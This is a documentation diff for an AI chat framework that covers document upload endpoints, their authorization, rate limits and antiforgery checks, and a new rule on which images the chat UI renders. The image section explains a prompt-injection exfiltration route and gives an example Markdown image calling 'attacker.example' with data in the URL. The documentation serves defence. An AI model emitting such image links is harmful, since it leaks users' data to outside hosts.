@@ -295,13 +295,47 @@ The MVC sample also registers an `AIChatSessionCloseBackgroundService` that runs
 The framework now ships reusable minimal API extensions for chat document uploads and removals:
 
 ```csharp
-app.AddUploadChatInteractionDocumentEndpoint()
-    .AddRemoveChatInteractionDocumentEndpoint()
-    .AddUploadChatSessionDocumentEndpoint()
-    .AddRemoveChatSessionDocumentEndpoint();
+app.AddUploadChatInteractionDocumentEndpoint();
+app.AddRemoveChatInteractionDocumentEndpoint();
+app.AddUploadChatSessionDocumentEndpoint();
+app.AddRemoveChatSessionDocumentEndpoint();
 ```
 
 The built-in document endpoints commit staged store writes before returning so uploaded files, removed files, and updated document metadata persist across reloads. When you build your own minimal APIs on top of the same store abstractions, apply `StoreCommitterEndpointFilter` or call `IStoreCommitter.CommitAsync()` explicitly before returning.
+
+Each `Add*Endpoint()` method returns the endpoint's `RouteHandlerBuilder`, so a host can add its own endpoint filters or
+metadata. Because the return type is no longer the route builder, call each method on `app` as above instead of
+chaining them.
+
+The session upload endpoint is safe to expose to signed-in users and anonymous visitors:
+
+- it authorizes the caller (`AIChatDocumentOperations.ManageDocuments`) before it creates or saves a session, and a
+  session id that does not exist, or that another user owns, is treated as no session at all
+- an upload that starts a session is counted by the same session-start limiter as the chat hub (`IChatSessionStartRateLimiter`)
+  and answers `429` when the caller started too many
+- a session holds at most `ChatDocumentsOptions.MaxDocumentsPerSession` documents (default `20`; `0` disables the limit),
+  and files past it come back in the `failed` list
+- the four upload and remove endpoints run `CookieAuthenticationAntiforgeryEndpointFilter`, which validates the
+  antiforgery token (the `RequestVerificationToken` header or form field) of a request whose credential the browser
+  attaches by itself. It exempts only identities from the schemes in
+  `AntiforgeryEndpointFilterOptions.NonCookieAuthenticationTypes` (`Bearer`, `Api`, `ApiKey`, `OpenIddict.Validation.AspNetCore`;
+  add the one your API scheme produces); an `Authorization` header exempts nothing. An anonymous request carrying the
+  visitor cookie is validated too, and an anonymous request without it needs no token. `AddCoreAIDocumentProcessing`
+  registers `AddAntiforgery()`.
+- the remove endpoint and the document download endpoints check that the caller owns the session whose documents they
+  touch, as upload does, and answer `404` for someone else's. A signed-in caller owns a session stamped with their
+  name identifier or their name. Uploads to one session run one at a time inside the process, so the cap holds under
+  parallel uploads; across several instances, use a store that checks concurrency or sticky routing.
+
+The vendored `ai-chat.js` and `chat-interaction.js` send the token for you. They read it from the chat config's
+`antiforgeryToken`, else from `<meta name="RequestVerificationToken" content="...">`, else from the hidden
+`__RequestVerificationToken` field of a form on the page. Put the token on the page when users sign in with cookies:
+
+```cshtml
+@inject Microsoft.AspNetCore.Antiforgery.IAntiforgery Antiforgery
+
+<meta name="RequestVerificationToken" content="@Antiforgery.GetAndStoreTokens(Context).RequestToken" />
+```
 
 These endpoints:
 
@@ -739,6 +773,33 @@ The bundled chat UI components (`ai-chat.js` and `chat-interaction.js`) support 
 ### Image Generation
 
 When an image-capable deployment is configured (e.g., a DALL-E model), the `GenerateImageTool` produces image URLs that the chat UI renders inline. No additional client-side libraries are required — generated images are displayed automatically using standard `<img>` tags.
+
+### Which images the chat draws
+
+A Markdown image in an answer makes the browser fetch its address on its own, and text the model was tricked into
+writing, or read out of a document, can put what it knows in that address
+(`![](https://attacker.example/pixel?data=...)`). So the chat only draws an image that comes from the page's own
+origin, from a host in `allowedImageHosts`, or that is a `data:` or same-origin `blob:` image, which makes no request.
+Any other image is shown as a plain link the visitor must choose to follow. Raw `<img>` tags in an answer follow the same
+rule.
+
+`allowedImageHosts` is a chat config option of both `ai-chat.js` and `chat-interaction.js`: an array of host names,
+where `images.example.com` matches that host and `*.example.com` matches its subdomains (not the bare domain). It is
+empty by default, which means same-origin only. Figures served by this host (`/ai/documents/{id}/figures/{figureId}`)
+are same-origin and need no entry.
+
+The same rule covers everything else in an answer's HTML that makes the browser fetch an address without a click:
+`<video>`, `<audio>`, `<source>`, `<track>`, `<input>`, SVG and MathML, the `poster`, `background` and `srcset` attributes,
+and any `style` that is more than plain declarations (so no `url()`, `image-set()` or CSS escape). Those are removed,
+not allowlisted. An allowed host that redirects to another site is still followed by the browser, so list only hosts you
+trust to serve images and not to redirect.
+
+```js
+window.coreAIChatManager().initialize({
+    // ...
+    allowedImageHosts: ['images.example.com', '*.cdn.example.com']
+});
+```
 
 ### Interactive Charts
 
